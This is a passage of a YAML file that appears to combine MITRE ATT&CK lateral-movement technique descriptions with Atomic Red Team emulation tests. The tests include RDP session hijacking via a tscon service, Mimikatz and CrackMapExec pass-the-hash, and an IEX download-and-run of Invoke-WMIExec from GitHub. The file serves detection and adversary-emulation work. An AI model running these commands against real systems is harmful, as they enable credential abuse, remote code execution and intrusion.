      - url: http://blog.gentilkiwi.com/securite/mimikatz/pass-the-ticket-kerberos
        description: Deply, B. (2014, January 13). Pass the ticket. Retrieved June
          2, 2016.
        source_name: GentilKiwi Pass the Ticket
      - url: http://defcon.org/images/defcon-22/dc-22-presentations/Campbell/DEFCON-22-Christopher-Campbell-The-Secret-Life-of-Krbtgt.pdf
        description: Campbell, C. (2014). The Secret Life of Krbtgt. Retrieved December
          4, 2014.
        source_name: Campbell 2014
      - url: https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
        description: Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016,
          April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.
        source_name: CERT-EU Golden Ticket Protection
      modified: '2020-01-30T19:57:16.037Z'
      name: Pass the Ticket
      description: |-
        Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.

        In this technique, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access. (Citation: ADSecurity AD Kerberos Attacks) (Citation: GentilKiwi Pass the Ticket)

        Silver Tickets can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint). (Citation: ADSecurity AD Kerberos Attacks)

        Golden Tickets can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory. (Citation: Campbell 2014)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Audit all Kerberos authentication and credential use events and review for discrepancies. Unusual remote authentication events that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity.

        Event ID 4769 is generated on the Domain Controller when using a golden ticket after the KRBTGT password has been reset twice, as mentioned in the mitigation section. The status code 0x1F indicates the action has failed due to "Integrity check on decrypted field failed" and indicates misuse by a previously invalidated golden ticket. (Citation: CERT-EU Golden Ticket Protection)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_system_requirements:
      - Requires Microsoft Windows as a target system and Kerberos authentication
        enabled.
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1570:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5
      created: '2020-03-11T21:01:00.959Z'
      x_mitre_version: '1.2'
      external_references:
      - source_name: mitre-attack
        external_id: T1570
        url: https://attack.mitre.org/techniques/T1570
      - source_name: Unit42 LockerGoga 2019
        url: https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/
        description: Harbison, M. (2019, March 26). Born This Way? Origins of LockerGoga.
          Retrieved April 16, 2019.
      x_mitre_deprecated: false
      revoked: false
      description: |-
        Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)

        Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095).
      modified: '2022-04-19T15:34:49.016Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      name: Lateral Tool Transfer
      x_mitre_detection: 'Monitor for file creation and files transferred within a
        network using protocols such as SMB or FTP. Unusual processes with internal
        network connections creating files on-system may be suspicious. Consider monitoring
        for abnormal usage of utilities and command-line arguments that may be used
        in support of remote transfer of files. Considering monitoring for alike file
        hashes or characteristics (ex: filename) that are created on multiple hosts.'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_is_subtechnique: false
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Flow'
      - 'Process: Process Creation'
      - 'File: File Metadata'
      - 'Network Traffic: Network Traffic Content'
      - 'Named Pipe: Named Pipe Metadata'
      - 'Network Share: Network Share Access'
      - 'Command: Command Execution'
      - 'File: File Creation'
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1184:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Anastasios Pingios
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c1b11bf7-c68e-4fbf-a95b-28efbe7953bb
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1184
        url: https://attack.mitre.org/techniques/T1184
      - url: https://www.slideshare.net/morisson/mistrusting-and-abusing-ssh-13526219
        description: Duarte, H., Morrison, B. (2012). (Mis)trusting and (ab)using
          ssh. Retrieved January 8, 2018.
        source_name: Slideshare Abusing SSH
      - url: https://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf
        description: 'Adam Boileau. (2005, August 5). Trust Transience:  Post Intrusion
          SSH Hijacking. Retrieved December 19, 2017.'
        source_name: SSHjack Blackhat
      - url: https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking
        description: Beuchler, B. (2012, September 28). SSH Agent Hijacking. Retrieved
          December 20, 2017.
        source_name: Clockwork SSH Agent Hijacking
      - url: https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/
        description: M.LÃ©veillÃ©, M. (2014, February 21). An In-depth Analysis of Linux/Ebury.
          Retrieved January 8, 2018.
        source_name: Welivesecurity Ebury SSH
      modified: '2020-02-25T19:00:50.826Z'
      name: SSH Hijacking
      description: |-
        Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.

        In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)

        [SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Use of SSH may be legitimate, depending upon the network
        environment and how it is used. Other factors, such as access patterns and
        activity that occurs after a remote login, may indicate suspicious or malicious
        behavior with SSH. Monitor for user accounts logged into systems they would
        not normally access or access patterns to multiple systems over a relatively
        short period of time. Also monitor user SSH-agent socket files being used
        by different users.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - root
      x_mitre_system_requirements:
      - SSH service enabled, trust relationships configured, established connections
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1075:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Travis Smith, Tripwire
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c23b740b-a42b-47a1-aec2-9d48ddd547ff
      type: attack-pattern
      created: '2017-05-31T21:30:59.339Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1075
        url: https://attack.mitre.org/techniques/T1075
      - external_id: CAPEC-644
        source_name: capec
        url: https://capec.mitre.org/data/definitions/644.html
      - source_name: NSA Spotting
        description: National Security Agency/Central Security Service Information
          Assurance Directorate. (2015, August 7). Spotting the Adversary with Windows
          Event Log Monitoring. Retrieved September 6, 2018.
        url: https://apps.nsa.gov/iaarchive/library/reports/spotting-the-adversary-with-windows-event-log-monitoring.cfm
      modified: '2020-01-30T19:55:38.699Z'
      name: Pass the Hash
      description: "Pass the hash (PtH) is a method of authenticating as a user without
        having access to the user's cleartext password. This method bypasses standard
        authentication steps that require a cleartext password, moving directly into
        the portion of the authentication that uses the password hash. In this technique,
        valid password hashes for the account being used are captured using a Credential
        Access technique. Captured hashes are used with PtH to authenticate as that
        user. Once authenticated, PtH may be used to perform actions on local or remote
        systems. \n\nWindows 7 and higher with KB2871997 require valid domain user
        credentials or RID 500 administrator hashes. (Citation: NSA Spotting)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Audit all logon and credential use events and review for
        discrepancies. Unusual remote logins that correlate with other suspicious
        activity (such as writing and executing binaries) may indicate malicious activity.
        NTLM LogonType 3 authentications that are not associated to a domain login
        and are not anonymous logins are suspicious.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_system_requirements:
      - Requires Microsoft Windows as target system
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1028:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c3bce4f4-9795-46c6-976e-8676300bbc39
      type: attack-pattern
      created: '2017-05-31T21:30:33.723Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1028
        url: https://attack.mitre.org/techniques/T1028
      - external_id: CAPEC-555
        source_name: capec
        url: https://capec.mitre.org/data/definitions/555.html
      - url: http://msdn.microsoft.com/en-us/library/aa384426
        description: Microsoft. (n.d.). Windows Remote Management. Retrieved November
          12, 2014.
        source_name: Microsoft WinRM
      - url: https://www.slideshare.net/kieranjacobsen/lateral-movement-with-power-shell-2
        description: Jacobsen, K. (2014, May 16). Lateral Movement with PowerShell&#91;slides&#93;.
          Retrieved November 12, 2014.
        source_name: Jacobsen 2014
      - source_name: Medium Detecting Lateral Movement
        url: https://medium.com/threatpunter/detecting-lateral-movement-using-sysmon-and-splunk-318d3be141bc
        description: French, D. (2018, September 30). Detecting Lateral Movement Using
          Sysmon and Splunk. Retrieved October 11, 2019.
      modified: '2020-02-11T18:30:20.937Z'
      name: Windows Remote Management
      description: 'Windows Remote Management (WinRM) is the name of both a Windows
        service and a protocol that allows a user to interact with a remote system
        (e.g., run an executable, modify the Registry, modify services). (Citation:
        Microsoft WinRM) It may be called with the <code>winrm</code> command or by
        any number of programs such as PowerShell. (Citation: Jacobsen 2014)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: 'Monitor use of WinRM within an environment by tracking service
        execution. If it is not normally used or is disabled, then this may be an
        indicator of suspicious behavior. Monitor processes created and actions taken
        by the WinRM process or a WinRM invoked script to correlate it with other
        related events. (Citation: Medium Detecting Lateral Movement)'
      x_mitre_version: '1.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_system_requirements:
      - WinRM listener turned on and configured on remote system
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1550.004:
    technique:
      modified: '2023-03-30T21:01:51.836Z'
      name: Web Session Cookie
      description: |-
        Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)

        Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.

        There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Jen Burns, HubSpot
      - Johann Rehberger
      x_mitre_detection: Monitor for anomalous access of websites and cloud-based
        applications by the same user in different locations or by different systems
        that do not match expected configurations.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Office 365
      - SaaS
      - Google Workspace
      - IaaS
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Web Credential: Web Credential Usage'
      x_mitre_defense_bypassed:
      - System Access Controls
      type: attack-pattern
      id: attack-pattern--c3c8c916-2f3c-4e71-94b2-240bdfc996f0
      created: '2020-01-30T17:48:49.395Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1550/004
        external_id: T1550.004
      - source_name: Pass The Cookie
        description: Rehberger, J. (2018, December). Pivot to the Cloud using Pass
          the Cookie. Retrieved April 5, 2019.
        url: https://wunderwuzzi23.github.io/blog/passthecookie.html
      - source_name: Unit 42 Mac Crypto Cookies January 2019
        description: Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware
          Steals Cryptocurrency Exchangesâ€™ Cookies. Retrieved October 14, 2019.
        url: https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
    atomic_tests: []
  T1506:
    technique:
      x_mitre_platforms:
      - Office 365
      - SaaS
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Johann Rehberger
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--c5e31fb5-fcbd-48a4-af8c-5a6ed5b932e5
      type: attack-pattern
      created: '2019-10-08T20:08:56.205Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1506
        url: https://attack.mitre.org/techniques/T1506
      - description: Rehberger, J. (2018, December). Pivot to the Cloud using Pass
          the Cookie. Retrieved April 5, 2019.
        url: https://wunderwuzzi23.github.io/blog/passthecookie.html
        source_name: Pass The Cookie
      - source_name: Unit 42 Mac Crypto Cookies January 2019
        url: https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/
        description: Chen, Y., Hu, W., Xu, Z., et. al. (2019, January 31). Mac Malware
          Steals Cryptocurrency Exchangesâ€™ Cookies. Retrieved October 14, 2019.
      modified: '2020-12-17T16:57:07.529Z'
      name: Web Session Cookie
      description: "Adversaries can use stolen session cookies to authenticate to
        web applications and services. This technique bypasses some multi-factor authentication
        protocols since the session is already authenticated.(Citation: Pass The Cookie)\n\nAuthentication
        cookies are commonly used in web applications, including cloud-based services,
        after a user has authenticated to the service so credentials are not passed
        and re-authentication does not need to occur as frequently. Cookies are often
        valid for an extended period of time, even if the web application is not actively
        used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539),
        the adversary then imports the cookie into a browser they control and is able
        to use the site or application as the user for as long as the session cookie
        is active. Once logged into the site, an adversary can access sensitive information,
        read email, or perform actions that the victim account has permissions to
        perform.\n\nThere have been examples of malware targeting session cookies
        to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto
        Cookies January 2019) "
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: Monitor for anomalous access of websites and cloud-based
        applications by the same user in different locations or by different systems
        that do not match expected configurations.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Logon Credentials
      - Multi-Factor Authentication
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1563.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--e0033c16-a07e-48aa-8204-7c3ca669998c
      type: attack-pattern
      created: '2020-02-25T18:35:42.765Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1563.002
        url: https://attack.mitre.org/techniques/T1563/002
      - url: https://technet.microsoft.com/en-us/windowsserver/ee236407.aspx
        description: Microsoft. (n.d.). Remote Desktop Services. Retrieved June 1,
          2016.
        source_name: TechNet Remote Desktop Services
      - url: http://www.korznikov.com/2017/03/0-day-or-feature-privilege-escalation.html
        description: Korznikov, A. (2017, March 17). Passwordless RDP Session Hijacking
          Feature All Windows versions. Retrieved December 11, 2017.
        source_name: RDP Hijacking Korznikov
      - url: https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6
        description: Beaumont, K. (2017, March 19). RDP hijackingâ€Šâ€”â€Šhow to hijack
          RDS and RemoteApp sessions transparently to move through an organisation.
          Retrieved December 11, 2017.
        source_name: RDP Hijacking Medium
      - url: https://github.com/nccgroup/redsnarf
        description: NCC Group PLC. (2016, November 1). Kali Redsnarf. Retrieved December
          11, 2017.
        source_name: Kali Redsnarf
      modified: '2020-03-23T23:24:39.182Z'
      name: 'Remote Service Session Hijacking: RDP Hijacking'
      description: |-
        Adversaries may hijack a legitimate userâ€™s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)

        Adversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\windows\system32\tscon.exe [session number to be stolen]`, an adversary can hijack a session without the need for credentials or prompts to the user.(Citation: RDP Hijacking Korznikov) This can be done remotely or locally and with active or disconnected sessions.(Citation: RDP Hijacking Medium) It can also lead to [Remote System Discovery](https://attack.mitre.org/techniques/T1018) and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.(Citation: Kali Redsnarf)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_detection: |-
        Consider monitoring processes for `tscon.exe` usage and monitor service creation that uses `cmd.exe /k` or `cmd.exe /c` in its arguments to detect RDP session hijacking.

        Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP.
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Logon Session: Logon Session Creation'
      - 'Network Traffic: Network Traffic Content'
      x_mitre_permissions_required:
      - SYSTEM
      identifier: T1563.002
    atomic_tests:
    - name: RDP hijacking
      auto_generated_guid: a37ac520-b911-458e-8aed-c5f1576d9f46
      description: "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6)
        - how to hijack RDS and RemoteApp sessions transparently to move through an
        organization\n"
      supported_platforms:
      - windows
      input_arguments:
        Session_ID:
          description: The ID of the session to which you want to connect
          type: string
          default: '1337'
        Destination_ID:
          description: Connect the session of another user to a different session
          type: string
          default: rdp-tcp#55
      executor:
        command: |
          query user
          sc.exe create sesshijack binpath= "cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}"
          net start sesshijack
        cleanup_command: 'sc.exe delete sesshijack >nul 2>&1

          '
        name: command_prompt
        elevation_required: true
  T1550.002:
    technique:
      modified: '2023-03-30T21:01:45.141Z'
      name: 'Use Alternate Authentication Material: Pass the Hash'
      description: |-
        Adversaries may â€œpass the hashâ€? using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.

        When performing PtH, valid password hashes for the account being used are captured using a [Credential Access](https://attack.mitre.org/tactics/TA0006) technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.

        Adversaries may also use stolen password hashes to "overpass the hash." Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) attacks.(Citation: Stealthbits Overpass-the-Hash)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Blake Strom, Microsoft 365 Defender
      - Travis Smith, Tripwire
      x_mitre_detection: |-
        Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.

        Event ID 4768 and 4769 will also be generated on the Domain Controller when a user requests a new ticket granting ticket or service ticket. These events combined with the above activity may be indicative of an overpass the hash attempt.(Citation: Stealthbits Overpass-the-Hash)
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Active Directory: Active Directory Credential Request'
      - 'User Account: User Account Authentication'
      - 'Logon Session: Logon Session Creation'
      x_mitre_defense_bypassed:
      - System Access Controls
      type: attack-pattern
      id: attack-pattern--e624264c-033a-424d-9fd7-fc9c3bbdb03e
      created: '2020-01-30T16:36:51.184Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1550/002
        external_id: T1550.002
      - source_name: Stealthbits Overpass-the-Hash
        description: Warren, J. (2019, February 26). How to Detect Overpass-the-Hash
          Attacks. Retrieved February 4, 2021.
        url: https://stealthbits.com/blog/how-to-detect-overpass-the-hash-attacks/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1550.002
    atomic_tests:
    - name: Mimikatz Pass the Hash
      auto_generated_guid: ec23cef9-27d9-46e4-a68d-6f75f7b86908
      description: |
        Note: must dump hashes first
        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
      supported_platforms:
      - windows
      input_arguments:
        user_name:
          description: username
          type: string
          default: Administrator
        ntlm:
          description: ntlm hash
          type: string
          default: cc36cf7a8514893efccd3324464tkg1a
        domain:
          description: domain
          type: string
          default: "%userdnsdomain%"
        mimikatz_path:
          description: mimikatz windows executable
          type: path
          default: "%tmp%\\mimikatz\\x64\\mimikatz.exe"
      dependency_executor_name: powershell
      dependencies:
      - description: 'Mimikatz executor must exist on disk and at specified location
          (#{mimikatz_path})

          '
        prereq_command: |
          $mimikatz_path = cmd /c echo #{mimikatz_path}
          if (Test-Path $mimikatz_path) {exit 0} else {exit 1}
        get_prereq_command: "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX
          (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\"
          -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl
          = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url
          | where-object { $_.endswith(\".zip\") }\n$mimikatz_exe = cmd /c echo #{mimikatz_path}\n$basePath
          = Split-Path $mimikatz_exe | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\"
          $basePath\n"
      executor:
        command: '#{mimikatz_path} "sekurlsa::pth /user:#{user_name} /domain:#{domain}
          /ntlm:#{ntlm}"

          '
        name: command_prompt
    - name: crackmapexec Pass the Hash
      auto_generated_guid: eb05b028-16c8-4ad8-adea-6f5b219da9a9
      description: 'command execute with crackmapexec

        '
      supported_platforms:
      - windows
      input_arguments:
        user_name:
          description: username
          type: string
          default: Administrator
        crackmapexec_exe:
          description: crackmapexec windows executable
          type: path
          default: C:\CrackMapExecWin\crackmapexec.exe
        command:
          description: command to execute
          type: string
          default: whoami
        ntlm:
          description: command
          type: string
          default: cc36cf7a8514893efccd3324464tkg1a
        domain:
          description: domain
          type: string
          default: "%userdnsdomain%"
      dependency_executor_name: powershell
      dependencies:
      - description: 'CrackMapExec executor must exist on disk at specified location
          (#{crackmapexec_exe})

          '
        prereq_command: 'if(Test-Path #{crackmapexec_exe}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Write-Host Automated installer not implemented yet, please
          install crackmapexec manually at this location: #{crackmapexec_exe}

          '
      executor:
        command: "#{crackmapexec_exe} #{domain} -u #{user_name} -H #{ntlm} -x #{command}\n"
        name: command_prompt
    - name: Invoke-WMIExec Pass the Hash
      auto_generated_guid: f8757545-b00a-4e4e-8cfb-8cfb961ee713
      description: |-
        Use Invoke-WMIExec to Pass the Hash
        Note: must dump hashes first
        [Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)
      supported_platforms:
      - windows
      input_arguments:
        ntlm:
          description: ntlm hash
          type: string
          default: cc36cf7a8514893efccd3324464tkg1a
        user_name:
          description: username
          type: string
          default: Administrator
        command:
          description: Command to run on target system
          type: string
          default: hostname
        target:
          description: System to run command on
          type: string
          default: "$env:COMPUTERNAME"
      executor:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
        name: powershell
  T1021.001:
    technique:
      modified: '2023-03-30T21:01:41.927Z'
      name: 'Remote Services: Remote Desktop Protocol'
      description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
        to log into a computer using the Remote Desktop Protocol (RDP). The adversary
        may then perform actions as the logged-on user.\n\nRemote desktop is a common
        feature in operating systems. It allows a user to log into an interactive
        session with a system desktop graphical user interface on a remote system.
        Microsoft refers to its implementation of the Remote Desktop Protocol (RDP)
        as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)
        \n\nAdversaries may connect to a remote system over RDP/RDS to expand access
        if the service is enabled and allows access to accounts with known credentials.
        Adversaries will likely use Credential Access techniques to acquire credentials
        to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility
        Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services
        DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation:
        Alperovitch Malware)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      x_mitre_contributors:
      - Matthew Demaske, Adaptforward
      x_mitre_detection: Use of RDP may be legitimate, depending on the network environment
        and how it is used. Other factors, such as access patterns and activity that
        occurs after a remote login, may indicate suspicious or malicious behavior
        with RDP. Monitor for user accounts logged into systems they would not normally
        access or access patterns to multiple systems over a relatively short period
        of time.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      x_mitre_version: '1.1'
      x_mitre_data_sources:
      - 'Network Traffic: Network Connection Creation'
      - 'Process: Process Creation'
      - 'Network Traffic: Network Traffic Flow'
      - 'Logon Session: Logon Session Creation'
      x_mitre_permissions_required:
      - Remote Desktop Users
      - User
